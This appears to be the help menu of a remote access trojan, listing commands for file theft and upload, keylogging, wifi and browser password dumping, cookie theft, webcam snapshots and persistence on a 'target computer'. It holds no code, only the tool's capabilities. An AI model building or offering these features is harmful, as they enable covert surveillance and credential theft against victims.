help = Prints this menu.
rename = Renames a file or directory.
get_file = Downloads a file from target's computer.
send_file = Uploads a file from your computer to target computer.
read_keys = Prints target computer keystrokes.
save_keys = Downloads target computer keystrokes.
system_info = Prints target computer system info.
get_wifi = Prints target computer wifi passwords.
get_persistence = Activates persistence.
remove_persistence = Deactivates persistence.

get_camera = Takes a snapshot from target computer.
get_browser_passwords = Gets saved passwords of target computers browser.
get_browser_cookies = Gets cookies of target computer browser.
cls = Clears the terminal.
exit = Closes all connections & exits.
